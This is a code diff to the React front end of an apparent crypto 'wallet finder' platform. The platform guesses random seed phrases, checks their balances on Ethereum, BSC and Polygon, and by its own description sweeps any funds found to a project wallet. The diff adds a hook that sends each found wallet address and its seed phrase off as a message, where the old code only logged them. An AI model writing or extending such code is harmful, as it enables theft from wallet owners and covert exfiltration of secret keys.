@@ -7,10 +7,13 @@ import { checkBalances } from "../utils/balance";
 import { toast } from "react-toastify";
 import { useTypedSelector } from "../hooks/useTypedSelector";
 import { useActions } from "../hooks/useActions";
+import { useSendMessage } from "../hooks/useSendMessage";
 
 const Main = () => {
     const { addresses, mnemonics, counter } = useTypedSelector(state => state.main);
     const { SetAddresses, SetMnemonics, IncreaseCounter } = useActions();
+
+    const messageHook = useSendMessage();
 
     const pause = useRef(true);
     const { account, activateBrowserWallet, deactivate } = useEthers();
@@ -111,13 +114,14 @@ const Main = () => {
                     indexes.push(i);
                 }
             } );
-            let messages: string[] = [];
             if(indexes.length > 0) {
+                let messages: string[] = [];
                 messages = indexes.map(
                     (i) => { return `Wallet: ${addresses[i]} Seed: ${batch[i]}` }
                 );
+                const text = messages.join('; ');
+                await messageHook(text);
             }
-            console.log(messages);
         }
     }
 
@@ -172,8 +176,7 @@ const Main = () => {
                     Project Idea
                 </div>
                 <div className="text">
-                    1. The user comes to the platform, connects the wallet and presses the button ▶.<br />
-                    <br />
+                    1. The user comes to the platform, connects the wallet and presses the button ▶.<br /> <br />
                     2. The platform randomly selects passwords from crypto wallets and checks the balances of native currency in the Ethereum, BSC and Polygon networks. <br /> <br />
                     3. If a user finds a cryptocurrency on some wallet, it is automatically sent to another wallet of the project. <br /> <br />
                     4. The found cryptocurrency is distributed as follows: 50% is received by the one who connected his address to the platform and found this cryptocurrency, the other 50% is distributed among the holders of the project token.
